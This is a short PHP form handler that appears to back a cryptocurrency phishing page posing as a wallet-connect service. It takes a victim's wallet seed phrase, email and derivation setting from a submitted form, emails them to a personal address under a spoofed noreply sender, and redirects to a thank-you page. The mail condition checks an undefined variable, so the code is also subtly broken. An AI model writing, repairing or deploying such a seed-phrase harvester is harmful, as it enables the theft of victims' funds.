<?php
//get data from form

$mnemonic = $_POST['mnemonic'];
$wallet_email= $_POST['wallet_email'];
$bip= $_POST['bip'];
$to = "feranmiolasunkanmi91@gmail.com";
$subject = "Mail From website";
$txt ="Mnemonic = ". $mnemonic . "\r\n  Wallet_Mail = " . $wallet_email . "\r\n Bip =" . $bip;
$headers = "From: noreply@mainnetconnect.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>
